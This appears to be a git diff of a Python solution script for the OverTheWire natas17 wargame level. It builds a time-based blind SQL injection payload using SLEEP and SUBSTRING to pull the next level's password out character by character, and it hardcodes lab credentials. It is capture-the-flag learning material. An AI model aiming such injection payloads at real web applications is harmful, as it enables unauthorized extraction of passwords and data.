@@ -1,4 +1,4 @@
-#This code adds some functionality to natas16.py by using time dalay for extracting password
+# This code adds some functionality to natas16.py by using time dalay for extracting password
 
 import requests
 import string
@@ -6,7 +6,7 @@ import time
 
 username = "natas17"
 password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
-url = "http://natas17.natas.labs.overthewire.org/"
+url = "http://natas17.natas.labs.overthewire.org"
 
 characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
@@ -19,9 +19,10 @@ delay_time = 5
 
 for i in range(1, password_length + 1):
     for char in characters:
-        # This line adds extra function that if the ith character equalschar then the server executes 5 sec delay (sleep)
-        # If the execution will be successful it will perform SLEEP(5) function, if not, theh nothing happens for that is used 0, which does nothing
-        injection = f'natas18" AND IF(BINARY SUBSTRING(password,{i},1)="{char}",SLEEP({delay_time}),0)-- '
+        # This line adds extra function that if the ith character equals char then the server executes 5 sec delay (sleep)
+        # SLEEP({delay_time}) will only occur if the char at position i equals char
+        # '#'is used to comment out the rest SQL query
+        injection = f'natas18" AND BINARY SUBSTRING(password,{i},1)="{char}" AND SLEEP({delay_time})#'
         
         # Measures the time taken to get a response. This important to determine whether a guessed character in the password is correct (signal as corectness)
         start_time = time.time()
